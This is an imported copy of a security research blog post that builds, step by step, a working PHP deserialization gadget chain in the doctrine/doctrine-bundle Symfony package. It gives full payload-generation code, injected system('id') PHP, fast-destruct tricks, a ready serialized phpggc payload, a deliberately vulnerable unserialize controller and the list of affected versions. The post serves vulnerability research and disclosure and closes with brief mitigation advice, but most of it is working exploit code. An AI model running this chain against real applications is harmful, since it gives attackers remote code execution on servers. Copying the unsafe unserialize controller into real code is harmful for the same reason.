---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-10-11_finding-a-pop-chain-on-a-common-symfony-bundle-part-2.md
original_filename: 2023-10-11_finding-a-pop-chain-on-a-common-symfony-bundle-part-2.md
title: 'Finding A Pop Chain On A Common Symfony Bundle: Part 2'
category: documents
detected_topics:
- command-injection
- automation-abuse
- information-disclosure
- api-security
- supply-chain
tags:
- imported
- documents
- command-injection
- automation-abuse
- information-disclosure
- api-security
- supply-chain
language: en
raw_sha256: 3dae7df98863e168906cd1ea730205dba2bcd793f69b58589a25d4baf871084b
text_sha256: 8c4ee82dccdab65d8af9e683374441f3cebd52b72f128c61d01cadc1d2152c31
ingested_at: '2026-06-28T07:32:26Z'
sensitivity: unknown
redactions_applied: false
---

# Finding A Pop Chain On A Common Symfony Bundle: Part 2

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-10-11_finding-a-pop-chain-on-a-common-symfony-bundle-part-2.md
- Source Type: markdown
- Detected Topics: command-injection, automation-abuse, information-disclosure, api-security, supply-chain
- Ingested At: 2026-06-28T07:32:26Z
- Redactions Applied: False
- Raw SHA256: `3dae7df98863e168906cd1ea730205dba2bcd793f69b58589a25d4baf871084b`
- Text SHA256: `8c4ee82dccdab65d8af9e683374441f3cebd52b72f128c61d01cadc1d2152c31`


## Content

---
title: "Finding A Pop Chain On A Common Symfony Bundle: Part 2"
page_title: "Finding a POP chain on a common Symfony bundle : part 2"
url: "https://www.synacktiv.com/publications/finding-a-pop-chain-on-a-common-symfony-bundle-part-2"
final_url: "https://www.synacktiv.com/publications/finding-a-pop-chain-on-a-common-symfony-bundle-part-2"
authors: ["Rémi Matasse (@_remsio_)"]
programs: ["doctrine-bundle (Symfony package)"]
bugs: ["Insecure deserialization", "RCE", "Security code review"]
publication_date: "2023-10-11"
added_date: "2023-12-26"
source: "pentester.land/writeups.json"
original_index: 721
---

# Finding a POP chain on a common Symfony bundle : part 2

Rédigé par Rémi Matasse \- 11/10/2023 - dans Pentest \- [Téléchargement](finding-a-pop-chain-on-a-common-symfony-bundle-part-2#) __

The Symfony `doctrine/doctrine-bundle` package is one of the most common bundles installed along Symfony applications. At the time we are releasing this blogpost, it has been downloaded [144 million times](https://packagist.org/packages/doctrine/doctrine-bundle), making it an interesting target for unserialize exploitation. If you want to improve your knowledge about PHP unserialize exploitation and see why weak typed languages are considered less secure, this blogpost is for you.

The second part of this article will be focused on building a valid POP chain based on the code already analyzed in the first part [in the first part](https://www.synacktiv.com/publications/finding-a-pop-chain-on-a-common-symfony-bundle-part-1). Reading it is not a requirement to understand the build of the chain, however it is greatly recommended in order to deeply understand the code subtleties.

Vous souhaitez améliorer vos compétences ? Découvrez nos sessions de **formation** ! [En savoir plus](../offres/formations)

Now that all the code used by the POP chain has been detailed on the first part of this blogpost, let's see how to craft our payload. This POP chain is already commited in [phpggc](https://github.com/ambionics/phpggc/tree/master/gadgetchains/Doctrine/RCE/1) as `Doctrine/RCE1`. We will once again proceed step by step to see how and why it was designed this way. The first steps of this section are run on PHP `8.1.22`.

The `serialize.php` file is used to generate the payload and will be updated step by step in this section. The template looks like this.
  
  
  <?php
  
  namespace <namespace_name_from_vendor>
  {
  [...]
  }
  [...]
  
  namespace PopChain
  {
  use <class_name_from_vendor>;
  
  $obj =<class_name_from_vendor>();
  [...]
  
  $serialized = serialize($obj);
  echo serialize($obj);
  }

The `unserialize.php` file is used to test the unserialization. It includes the dependencies from the `doctrine/doctrine-bundle` package in our case.
  
  
  <?php
  
  include "vendor/autoload.php";
  unserialize('<serizalized_data_to_test>');

The `doctrine-bundle` packages are installed via composer.
  
  
  $ composer require doctrine/doctrine-bundle
  ./composer.json has been updated
  Running composer update doctrine/doctrine-bundle
  Loading composer repositories with package information
  Updating dependencies
  Nothing to modify in lock file
  Installing dependencies from lock file (including require-dev)
  Package operations: 35 installs, 0 updates, 0 removals
  [...]

### First step: reach CacheAdapter

Let's see what happens while unserializing a `CacheAdapter` object.
  
  
  <?php
  
  namespace Doctrine\Common\Cache\Psr6
  {
  class CacheAdapter
  {
  }
  }
  
  namespace PopChain
  {
  use Doctrine\Common\Cache\Psr6\CacheAdapter;
  
  $obj = new CacheAdapter();
  
  $serialized = serialize($obj);
  echo serialize($obj);
  }
  
  
  $ php unserialize.php
  

Nothing happens at first because all the logic in the `commit` function depends on the `defferedItems` attribute. If it is not defined, the code will simply return `true`.
  
  
  <?php
  
  namespace Doctrine\Common\Cache\Psr6;
  
  final class CacheAdapter implements CacheItemPoolInterface
  {
  /** @var Cache */
  private $cache;
  
  /** @var array<CacheItem|TypedCacheItem> */
  private $deferredItems = [];
  [...]
  public function commit(): bool
  {
  if (! $this->deferredItems) {
  return true;
  }
  [...]
  }
  }

By setting `defferedItems` as an empty array, we get the following error message, meaning we indeed reached the `commit` function.
  
  
  $ php unserialize.php 
  
  Fatal error: Uncaught TypeError: Doctrine\Common\Cache\Psr6\CacheAdapter::commit(): Return value must be of type bool, null returned in /tmp/vendor/doctrine/cache/lib/Doctrine/Common/Cache/Psr6/CacheAdapter.php:235
  Stack trace:
  #0 /tmp/vendor/doctrine/cache/lib/Doctrine/Common/Cache/Psr6/CacheAdapter.php(248): Doctrine\Common\Cache\Psr6\CacheAdapter->commit()
  #1 /tmp/unserialize.php(4): Doctrine\Common\Cache\Psr6\CacheAdapter->__destruct()
  #2 {main}
  thrown in /tmp/vendor/doctrine/cache/lib/Doctrine/Common/Cache/Psr6/CacheAdapter.php on line 235

![access_commit](/sites/default/files/inline-images/step_one_popchain_0.webp) Reaching foreach in the commit function.

To progress in the code, it is mandatory to set at least one `deferredItem`. If we believe the PHP annotation defined in the code, it should either be a `CacheItem` or a `TypedCacheItem`. The difference is explained later in this article (cf [PHP version differences](finding-a-pop-chain-on-a-common-symfony-bundle-part-2#PHP_version_differences)). Therefore, a `TypedCacheItem` has been added in the `deferredItems` array.

As we can see in the `foreach` loop, a check on `expiry` is done, so our `TypedCacheItem` has to define an `expiry` attribute. Further inside the loop, its `value` will also be checked.
  
  
  <?php
  
  namespace Doctrine\Common\Cache\Psr6;
  
  [...]
  
  final class TypedCacheItem implements CacheItemInterface
  {
  private ?float $expiry = null;
  
  public function get(): mixed
  {
  return $this->value;
  }
  
  public function getExpiry(): ?float
  {
  return $this->expiry;
  }
  }

The `deferredItem` `expiry` value leads to two distinct possibilities. If the current timestamp is inferior to the `deferredItem` `expiry`, then the `save` method is reached.
  
  
  <?php
  
  namespace Doctrine\Common\Cache\Psr6
  {
  class CacheAdapter
  {
  public $deferredItems = true;
  }
  class TypedCacheItem
  {
  public $expiry = 99999999999999999;
  public $value = "test";
  }
  
  }
  
  namespace PopChain
  {
  use Doctrine\Common\Cache\Psr6\CacheAdapter;
  
  $obj = new CacheAdapter();
  
  $obj->deferredItems = [new TypedCacheItem()];
  echo serialize($obj);
  }
  
  
  $ php unserialize.php 
  
  Fatal error: Uncaught Error: Call to a member function save() on null in /tmp/vendor/doctrine/cache/lib/Doctrine/Common/Cache/Psr6/CacheAdapter.php:235
  Stack trace:
  #0 /tmp/vendor/doctrine/cache/lib/Doctrine/Common/Cache/Psr6/CacheAdapter.php(248): Doctrine\Common\Cache\Psr6\CacheAdapter->commit()
  #1 /tmp/unserialize.php(4): Doctrine\Common\Cache\Psr6\CacheAdapter->__destruct()
  #2 {main}
  thrown in /tmp/vendor/doctrine/cache/lib/Doctrine/Common/Cache/Psr6/CacheAdapter.php on line 235

Otherwise, if the current timestamp is superior to the `deferredItem` `expiry`, then the `delete` method is reached.
  
  
  <?php
  
  namespace Doctrine\Common\Cache\Psr6
  {
  class CacheAdapter
  {
  public $deferredItems = true;
  }
  class TypedCacheItem
  {
  public $expiry = 1;
  public $value = "test";
  }
  
  }
  
  namespace PopChain
  {
  
  use Doctrine\Common\Cache\Psr6\CacheAdapter;
  use Doctrine\Common\Cache\Psr6\TypedCacheItem;
  
  $obj = new CacheAdapter();
  
  $obj->deferredItems = [new TypedCacheItem()];
  echo serialize($obj);
  }
  
  
  $ php unserialize.php 
  
  Fatal error: Uncaught Error: Call to a member function delete() on null in /tmp/vendor/doctrine/cache/lib/Doctrine/Common/Cache/Psr6/CacheAdapter.php:227
  Stack trace:
  #0 /tmp/vendor/doctrine/cache/lib/Doctrine/Common/Cache/Psr6/CacheAdapter.php(248): Doctrine\Common\Cache\Psr6\CacheAdapter->commit()
  #1 /tmp/unserialize.php(4): Doctrine\Common\Cache\Psr6\CacheAdapter->__destruct()
  #2 {main}
  thrown in /tmp/vendor/doctrine/cache/lib/Doctrine/Common/Cache/Psr6/CacheAdapter.php on line 227

![reach_delete_or_save](/sites/default/files/inline-images/reach_delete_and_save.webp) Reaching delete or save functions.

### Writing a file

The first goal for this POP chain is to get a file written on the filesystem. To do so, we need to call `MockFileSessionStorage`'s `save` function.

The `save` method will be called on the `cache` attribute of the `CacheAdapter` object. After defining it in our file, we now reach an exception from the `MockFileSessionStorage` !
  
  
  <?php
  
  namespace Doctrine\Common\Cache\Psr6
  {
  class CacheAdapter
  {
  public $deferredItems = true;
  }
  class TypedCacheItem
  {
  public $expiry = 99999999999999999;
  public $value = "test";
  }
  
  }
  
  namespace Symfony\Component\HttpFoundation\Session\Storage
  {
  class MockFileSessionStorage
  {
  }
  }
  
  namespace PopChain
  {
  
  use Doctrine\Common\Cache\Psr6\CacheAdapter;
  use Doctrine\Common\Cache\Psr6\TypedCacheItem;
  use Symfony\Component\HttpFoundation\Session\Storage\MockFileSessionStorage;
  
  $obj = new CacheAdapter();
  $obj->cache = new MockFileSessionStorage();
  $obj->deferredItems = [new TypedCacheItem()];
  echo serialize($obj);
  }
  
  
  $ php unserialize.php 
  
  Fatal error: Uncaught RuntimeException: Trying to save a session that was not started yet or was already closed. in /tmp/vendor/symfony/http-foundation/Session/Storage/MockFileSessionStorage.php:79
  Stack trace:
  #0 /tmp/vendor/doctrine/cache/lib/Doctrine/Common/Cache/Psr6/CacheAdapter.php(235): Symfony\Component\HttpFoundation\Session\Storage\MockFileSessionStorage->save(0, 'test', 99999998326133680)
  #1 /tmp/vendor/doctrine/cache/lib/Doctrine/Common/Cache/Psr6/CacheAdapter.php(248): Doctrine\Common\Cache\Psr6\CacheAdapter->commit()
  #2 /tmp/unserialize.php(4): Doctrine\Common\Cache\Psr6\CacheAdapter->__destruct()
  #3 {main}
  thrown in /tmp/vendor/symfony/http-foundation/Session/Storage/MockFileSessionStorage.php on line 79

![mock_file_session_storage_reached](/sites/default/files/inline-images/mock_file_session_storage_reached.webp) Exception triggered from MockFileSessionStorage save function.

Let's have a quick analysis of the `save` function. If the `started` attribute is not defined, the previous exception will be triggered, so it needs to be set to `true`.

The `MetadataBag` object also has to be defined with the `storageKey` attribute.
  
  
  $ find . -name '*MetadataBag*'
  ./vendor/symfony/http-foundation/Session/Storage/MetadataBag.php
  
  $ cat ./vendor/symfony/http-foundation/Session/Storage/MetadataBag.php | grep getStorageKey -A 3
  public function getStorageKey(): string
  {
  return $this->storageKey;
  }

Finally, the following attributes need to be added to the `MockFileSessionStorage` object:

  * `savePath`: the path in which the file should be created
  * `id`: the file name to which the `.mocksess` extension will be appended
  * `data`: the file content that will be generated, here it will contain the PHP code we want to execute on the server

  
  
  <?php
  
  namespace Doctrine\Common\Cache\Psr6
  {
  class CacheAdapter
  {
  public $deferredItems = true;
  }
  class TypedCacheItem
  {
  public $expiry = 99999999999999999;
  public $value = "test";
  }
  
  }
  
  namespace Symfony\Component\HttpFoundation\Session\Storage
  {
  class MockFileSessionStorage
  {
  public $started = true;
  public $savePath = "/tmp"; // Produces /tmp/aaa.mocksess
  public $id = "aaa";
  public $data = ['<?php system("id"); phpinfo(); ?>'];
  }
  
  class MetadataBag
  {
  public $storageKey = "a";
  }
  }
  
  namespace PopChain
  {
  use Doctrine\Common\Cache\Psr6\CacheAdapter;
  use Doctrine\Common\Cache\Psr6\TypedCacheItem;
  use Symfony\Component\HttpFoundation\Session\Storage\MockFileSessionStorage;
  use Symfony\Component\HttpFoundation\Session\Storage\MetadataBag;
  
  $obj = new CacheAdapter();
  $obj->deferredItems = [new TypedCacheItem()];
  $mockSessionStorage = new MockFileSessionStorage();
  $mockSessionStorage->metadataBag = new MetadataBag();
  $obj->cache =$mockSessionStorage;
  
  echo serialize($obj);
  }

As shown in the following bash snippet, the `aaa.mocksess` file is generated on the server, after unserializing the payload. We have successfully created a file at a controlled path, therefore executing it as PHP successfully triggers the code we injected.
  
  
  $ php unserialize.php 
  
  Fatal error: Uncaught TypeError: Doctrine\Common\Cache\Psr6\CacheAdapter::commit(): Return value must be of type bool, null returned in /tmp/poc/vendor/doctrine/cache/lib/Doctrine/Common/Cache/Psr6/CacheAdapter.php:235
  Stack trace:
  #0 /tmp/poc/vendor/doctrine/cache/lib/Doctrine/Common/Cache/Psr6/CacheAdapter.php(248): Doctrine\Common\Cache\Psr6\CacheAdapter->commit()
  #1 /tmp/poc/unserialize.php(4): Doctrine\Common\Cache\Psr6\CacheAdapter->__destruct()
  #2 {main}
  thrown in /tmp/poc/vendor/doctrine/cache/lib/Doctrine/Common/Cache/Psr6/CacheAdapter.php on line 235
  $ ls -l /tmp/aaa.mocksess 
  -rw-r--r-- 1 root root 51 Feb 13 15:05 /tmp/aaa.mocksess
  $ php /tmp/aaa.mocksess 
  a:1:{i:0;s:33:"uid=0(root) gid=0(root) groups=0(root)
  phpinfo()
  PHP Version => 8.1.15

### Executing the file

Let's now demonstrate the inclusion payload. The following code will allow us to reach the `PhpArrayAdapter` `initialize` function detailed earlier.
  
  
  <?php
  
  namespace Doctrine\Common\Cache\Psr6
  {
  class CacheAdapter
  {
  public $deferredItems = true;
  }
  class TypedCacheItem
  {
  public $expiry = 1;
  public $value = "test";
  }
  
  }
  
  namespace Symfony\Component\Cache\Adapter
  {
  class PhpArrayAdapter
  {
  }
  }
  
  namespace PopChain
  {
  use Doctrine\Common\Cache\Psr6\CacheAdapter;
  use Doctrine\Common\Cache\Psr6\TypedCacheItem;
  use Symfony\Component\Cache\Adapter\PhpArrayAdapter;
  
  $obj = new CacheAdapter();
  $obj->cache = new PhpArrayAdapter();
  
  $obj->deferredItems = [new TypedCacheItem()];
  echo serialize($obj);
  }

Without any definition to the object, the function is successfully reached as shown in the following output.
  
  
  $ php unserialize.php 
  
  Deprecated: is_file(): Passing null to parameter #1 ($filename) of type string is deprecated in /tmp/poc/vendor/symfony/cache/Adapter/PhpArrayAdapter.php on line 391
  
  Fatal error: Uncaught Error: Call to a member function deleteItem() on null in /tmp/poc/vendor/symfony/cache/Adapter/PhpArrayAdapter.php:196
  Stack trace:
  #0 /tmp/poc/vendor/symfony/cache-contracts/CacheTrait.php(43): Symfony\Component\Cache\Adapter\PhpArrayAdapter->deleteItem('0')
  #1 /tmp/poc/vendor/doctrine/cache/lib/Doctrine/Common/Cache/Psr6/CacheAdapter.php(227): Symfony\Component\Cache\Adapter\PhpArrayAdapter->delete('0')
  #2 /tmp/poc/vendor/doctrine/cache/lib/Doctrine/Common/Cache/Psr6/CacheAdapter.php(248): Doctrine\Common\Cache\Psr6\CacheAdapter->commit()
  #3 /tmp/poc/unserialize.php(4): Doctrine\Common\Cache\Psr6\CacheAdapter->__destruct()
  #4 {main}
  thrown in /tmp/poc/vendor/symfony/cache/Adapter/PhpArrayAdapter.php on line 196

![error_in_file_inclusion_step](/sites/default/files/inline-images/error_file_inclusion.webp) Code reached from PhpArrayAdapter definition.

The last step to reach file inclusion is to define a value to the `file` attribute. The following POP chain aims to execute the code defined in the `/tmp/aaa.mocksess` file, which we generated before.
  
  
  <?php
  
  namespace Doctrine\Common\Cache\Psr6
  {
  class CacheAdapter
  {
  public $deferredItems = true;
  }
  class TypedCacheItem
  {
  public $expiry = 1;
  public $value = "test";
  }
  
  }
  
  namespace Symfony\Component\Cache\Adapter
  {
  class PhpArrayAdapter
  {
  public $file = "/tmp/aaa.mocksess"; // fixed at the time
  }
  }
  
  namespace PopChain
  {
  
  use Doctrine\Common\Cache\Psr6\CacheAdapter;
  use Doctrine\Common\Cache\Psr6\TypedCacheItem;
  use Symfony\Component\Cache\Adapter\PhpArrayAdapter;
  
  $obj = new CacheAdapter();
  $obj->cache = new PhpArrayAdapter();
  
  $obj->deferredItems = [new TypedCacheItem()];
  echo serialize($obj);
  }

As we can see when unserialized, the POP chain successfully reaches the `require` code. The PHP code we have previously written to `/tmp/aaa.mocksess` is reached, triggering a code execution on the system.
  
  
  $ php unserialize.php 
  a:1:{i:0;s:33:"uid=0(root) gid=0(root) groups=0(root)
  phpinfo()
  PHP Version => 8.1.15
  
  System => Linux 184f5674e38c 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
  Build Date => Feb  9 2023 08:04:45

### Last step: make both chains work together

Now that we saw how to generate both chains, there is still details needing to be discussed to make them work together. Indeed, the chains work greatly together, by triggering the file write in a first time, and the file inclusion after that. However, it is also possible to trigger both of them in one unserialization.

#### Fast destruct usage

Since two chains compose the POP chain, it is mandatory to use fast destruct in order to force the execution of both of them.

Fast destruct is a method used to force the call of the `__destruct()` functions right after unserialize. Since we entirely control the objects defined in an unserialized string, it is possible to create abnormal states, such as defining the same index twice in an array. This will have for effect to instantly trigger the `__destruct()` call on the object. To illustrate, fast destruct would be called on `\Namespace\Object1` and `\Namespace\Object2`, but not on `\Namespace\Object3` in the following example.

![fast_destruct_example](/sites/default/files/inline-images/fast_destruct_0.webp) Scheme representing a fast destruct definition.

In our POP chain, fast destruct is mandatory because we are using two distinct chains based on a `__destruct()` definition.

#### PHP version differences

There is one last point that has to be discussed : the PHP version matters for this POP chain.

All the demonstrations were made from PHP 8, which is compatible with `TypedCacheItem`. However, `TypedCacheItem` is not compatible with PHP 7 applications, the following error is raised from `CacheAdapter` on any of the previous POP chains.
  
  
  $ php unserialize.php 
  Parse error: syntax error, unexpected 'private' (T_PRIVATE), expecting variable (T_VARIABLE) in /tmp/poc/vendor/doctrine/cache/lib/Doctrine/Common/Cache/Psr6/TypedCacheItem.php on line 24

Once again, type definition is an issue here. As discussed earlier in this blogpost, there are two possible values for `defferedItems`: `TypedCacheItem` or `CacheItem`. `CacheItem` should be used on versions prior or equals to PHP 7.

If the `doctrine/doctrine-bundle` project is installed from PHP 8, the following compatibility issue will be triggered when `CacheItem` is used instead of `TypedCacheItem`.
  
  
  $ php unserialize.php 
  Fatal error: Declaration of Doctrine\Common\Cache\Psr6\CacheItem::get() must be compatible with Psr\Cache\CacheItemInterface::get(): mixed in /tmp/poc/vendor/doctrine/cache/lib/Doctrine/Common/Cache/Psr6/CacheItem.php on line 51

For this reason, the POP chain has to be adapted depending on the targeted PHP version.

#### The full chain

After taking every last steps in consideration, the final version of our `serialize.php` file looks as follows:
  
  
  <?php
  
  /* Entrypoint of the POPchain */
  namespace Doctrine\Common\Cache\Psr6
  {
  class CacheAdapter
  {
  public $deferredItems = true;
  }
  class CacheItem
  {
  public $expiry = 99999999999999999;
  public $value = "test";
  }
  
  class TypedCacheItem
  {
  public $expiry = 99999999999999999;
  public $value = "test";
  }
  
  }
  
  /* File write objects */
  namespace Symfony\Component\HttpFoundation\Session\Storage
  {
  class MockFileSessionStorage
  {
  public $started = true;
  public $savePath = "/tmp"; // Produces /tmp/aaa.mocksess
  public $id = "aaa"; // File name
  public $data = ['<?php echo "I was TRIGGERED"; system("id"); ?>']; // PHP code executed
  }
  
  class MetadataBag
  {
  public $storageKey = "a";
  }
  }
  
  /* File inclusion objects */
  namespace Symfony\Component\Cache\Adapter
  {
  class PhpArrayAdapter
  {
  public $file = "/tmp/aaa.mocksess"; // fixed at the time
  }
  }
  
  
  namespace PopChain
  {
  use Doctrine\Common\Cache\Psr6\CacheAdapter;
  use Doctrine\Common\Cache\Psr6\TypedCacheItem;
  use Symfony\Component\HttpFoundation\Session\Storage\MockFileSessionStorage;
  use Symfony\Component\HttpFoundation\Session\Storage\MetadataBag;
  use Symfony\Component\Cache\Adapter\PhpArrayAdapter;
  
  
  /* CacheItem is compatible with PHP 7.*, TypedCacheItem is compatible with PHP 8.* */
  if (preg_match('/^7/', phpversion()))
  {
  $firstCacheItem = new CacheItem();
  $secondCacheItem = new CacheItem();
  } 
  else 
  {
  $firstCacheItem = new TypedCacheItem();
  $secondCacheItem = new TypedCacheItem();
  }
  
  /* File write */
  $obj_write = new CacheAdapter();
  $obj_write->deferredItems = [$firstCacheItem];
  $mockSessionStorage = new MockFileSessionStorage();
  $mockSessionStorage->metadataBag = new MetadataBag();
  $obj_write->cache =$mockSessionStorage;
  
  /* File inclusion */
  $obj_include = new CacheAdapter();
  $obj_include->cache = new PhpArrayAdapter();
  $secondCacheItem->expiry = 0; // mandatory to go to another branch from CacheAdapter __destruct
  $obj_include->deferredItems = [$secondCacheItem];
  
  
  $obj = [1000 => $obj_write, 1001 => 1, 2000 => $obj_include, 2001 => 1];
  
  $serialized_string = serialize($obj);
  // Setting the indexes for fast destruct
  $find_write = (
  '#i:(' .
  1001 . '|' .
  (1001 + 1) .
  ');#'
  );
  $replace_write = 'i:' . 1000 . ';';
  $serialized_string2 = preg_replace($find_write, $replace_write, $serialized_string);
  $find_include = (
  '#i:(' .
  2001 . '|' .
  (2001 + 1) .
  ');#'
  );
  $replace_include = 'i:' . 2000 . ';';
  echo preg_replace($find_include, $replace_include, $serialized_string2);
  }

Running it will execute both POP chains and will be giving code execution on the system.
  
  
  $ php unserialize.php 
  a:1:{i:0;s:46:"I was TRIGGEREDuid=0(root) gid=0(root) groups=0(root)
  ";}
  Fatal error: Uncaught TypeError: Doctrine\Common\Cache\Psr6\CacheAdapter::commit(): Return value must be of type bool, null returned in /tmp/poc/vendor/doctrine/cache/lib/Doctrine/Common/Cache/Psr6/CacheAdapter.php:235
  [...]

The full chain has been pushed on the [phpggc](https://github.com/ambionics/phpggc/tree/master/gadgetchains/Doctrine/RCE/1) project, which is basically the reference project when looking for publicly disclosed POP chains.

Using phpggc to generate the POP chain discussed in this article si straightforward:
  
  
  $ phpggc Doctrine/rce1 'system("id");'  
  a:4:{i:1000;O:39:"Doctrine\Common\Cache\Psr6\CacheAdapter":3:{s:13:"deferredItems";a:1:{i:0;O:41:"Doctrine\Common\Cache\Psr6\TypedCacheItem":2:{s:6:"expiry";i:99999999999999999;s:5:"value";s:4:"test";}}s:6:"loader";i:1;s:5:"cache";O:71:"Symfony\Component\HttpFoundation\Session\Storage\MockFileSessionStorage":5:{s:7:"started";b:1;s:8:"savePath";s:4:"/tmp";s:2:"id";s:3:"aaa";s:4:"data";a:1:{i:0;s:22:"<?php system("id"); ?>";}s:11:"metadataBag";O:60:"Symfony\Component\HttpFoundation\Session\Storage\MetadataBag":1:{s:10:"storageKey";s:1:"a";}}}i:1000;i:1;i:2000;O:39:"Doctrine\Common\Cache\Psr6\CacheAdapter":3:{s:13:"deferredItems";a:1:{i:0;O:41:"Doctrine\Common\Cache\Psr6\TypedCacheItem":2:{s:6:"expiry";i:0;s:5:"value";s:4:"test";}}s:6:"loader";i:1;s:5:"cache";O:44:"Symfony\Component\Cache\Adapter\ProxyAdapter":1:{s:4:"pool";O:47:"Symfony\Component\Cache\Adapter\PhpArrayAdapter":1:{s:4:"file";s:17:"/tmp/aaa.mocksess";}}}i:2000;i:1;}

At this time, all the versions of the `doctrine/doctrine-bundle` package are affected since the version 1.5.1.

More details in the following phpggc [pull request](https://github.com/ambionics/phpggc/pull/140).

## Demonstration: let's exploit a Symfony-based application

Methodology is cool, but nothing is better than a demonstration to illustrate the risks.

### Demo

If you want to setup the environment, you need to create a Symfony application and to install the environment. In real life, `doctrine/doctrine-bundle` would be installed as long as the Symfony application uses doctrine as its ORM.

For this proof of concept the project has been setup on the following environment, you can reproduce it by running these commands.
  
  
  $ docker run -it -p 8000:80 php:8.1-apache /bin/bash  
  $ apt update && apt install wget git unzip libzip-dev
  $ wget https://getcomposer.org/installer -O composer-setup.php
  $ php composer-setup.php
  $ mv composer.phar /usr/local/bin/composer
  $ a2enmod rewrite
  $ cd /var/www
  $ composer create-project symfony/skeleton:"6.2.*" html
  $ composer require symfony/maker-bundle --dev
  $ php bin/console make:controller UnserializeController
  $ composer require symfony/apache-pack
  $ composer require doctrine/orm
  $ composer require doctrine/doctrine-bundle
  $ cat config/routes.yaml 
  controllers:
  resource:
  path: ../src/Controller/
  namespace: App\Controller
  type: annotation
  $ cat /etc/apache2/sites-enabled/000-default.conf
  <VirtualHost *:80>
  [...]
  ServerAdmin webmaster@localhost
  DocumentRoot /var/www/html/public
  [...]
  $ service apache2 start

Once the setup is complete, you should be able to reach the following page. Of course, keep in mind that the `doctrine/doctrine-bundle` has to be installed on the Symfony application.

![symfony_setup](/sites/default/files/inline-images/symfony_6.3.3.webp) Default installation page of a Symfony 6.3.3 application.

The `UnserializeController` class allows a user to send a base64-encoded serialized chain to unserialize it.
  
  
  <?php
  
  namespace App\Controller;
  
  use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
  use Symfony\Component\HttpFoundation\JsonResponse;
  use Symfony\Component\Routing\Annotation\Route;
  
  class UnserializeController extends AbstractController
  {
  #[Route('/unserialize')]
  public function index(): JsonResponse
  {
  if (isset($_GET['data'])){
  unserialize(base64_decode($_GET['data']));
  }
  return $this->json([
  'message' => 'Please send the data you want to unserialize with data param'
  ]);
  }
  }

Finally, a demonstration of the exploitation of the chain on the vulnerable controller. The Symfony application and phpggc are running in PHP 8.1.22.

![poc_popchain](../sites/default/files/inline-images/poc_popchain_exec.gif) Exploitation of a vulnerable Symfony controller with the POP chain.

### Vulnerable versions of the doctrine/doctrine-bundle

In order to test the efficiency of the POP chain, the phpggc [test-gc-compatibility.py script](https://github.com/ambionics/phpggc/blob/master/test-gc-compatibility.py) was used.

The POP chain can be exploited on the following version of PHP 8, the tests were run on PHP 8.1.22. The following command can be used to list the affected versions
  
  
  $ python3 test-gc-compatibility.py doctrine/doctrine-bundle doctrine/RCE1
  Running on PHP version PHP 8.1.22 (cli) (built: Feb 11 2023 10:43:39) (NTS).
  Testing 136 versions for doctrine/doctrine-bundle against 1 gadget chains.
  
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━━━━━━━━┓
  ┃ doctrine/doctrine-bundle  ┃ Package ┃ doctrine/RCE1 ┃
  ┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━╇━━━━━━━━━━━━━━━┩
  │ 2.11.x-dev  │  OK  │  OK  │
  │ 2.10.x-dev  │  OK  │  OK  │
  │ 2.10.2  │  OK  │  OK  │
  │ 2.10.1  │  OK  │  OK  │
  │ 2.10.0  │  OK  │  OK  │
  │ 2.9.x-dev  │  OK  │  OK  │
  │ 2.9.2  │  OK  │  OK  │
  [...]
  │ 1.12.x-dev  │  OK  │  OK  │
  │ 1.12.13  │  OK  │  OK  │
  │ 1.12.12  │  OK  │  OK  │
  │ 1.12.11  │  OK  │  OK  │
  │ 1.12.10  │  OK  │  OK  │
  [...]
  │ 1.6.x-dev  │  OK  │  OK  │
  │ 1.6.13  │  OK  │  OK  │
  │ 1.6.12  │  OK  │  OK  │
  │ 1.6.11  │  OK  │  OK  │
  [...]
  │ v1.0.0  │  OK  │  KO  │
  │ v1.0.0-RC1  │  OK  │  KO  │
  │ v1.0.0-beta1  │  KO  │  -  │
  │ dev-2.10.x-merge-up-into-2.11.x_IKPBtWeg │  OK  │  OK  │
  │ dev-symfony-7  │  OK  │  OK  │
  └──────────────────────────────────────────┴─────────┴───────────────┘

The POP chain will also work on PHP 7, vulnerable packages can be found on this phpggc [pull request](https://github.com/ambionics/phpggc/pull/140).

### Affected projects

That being said, this trick is not a vulnerability in itself, this POP chain can be used if user supplied data is sent to an `unserialize` function on any project using an affected version of the `doctrine/doctrine-bundle` package.

To patch `unserialize` issues, it is possible to use the `allowed_classes` parameter to use a whitelist of valid classes. However, it is recommended to treat user data with safer functions, such as `json_encode`, and to recreate the objects from this kind of encoding instead.

## Final thought

We thought it might be interesting to share the full research process since this POP chain involved several unserialize tricks. While this methodology might not be the most optimized, it gives an idea of the overall logic followed to identify POP chains and how to get started. In the current case, this illustrates greatly how a weakly typed language can be exploited.

While writing this article, some unnecessary steps were simplified in the Doctrine/RCE1 chain. You can take a look at the changes made in the [phpggc](https://github.com/ambionics/phpggc/tree/master/gadgetchains/Doctrine/RCE/1) project.

The usage of a PHP debugger such as [xdebug](https://xdebug.org/docs/) would greatly improve the speed of this process. However, this blogpost shows that fancy tools are not always mandatory to exploit vulnerabilities, you only need to understand what you are dealing with, and what you are aiming for. Even if POP chains are not exploitable by themselves, looking for them is a good exercise to understand how PHP code is interpreted deeply.

Partagez cet article
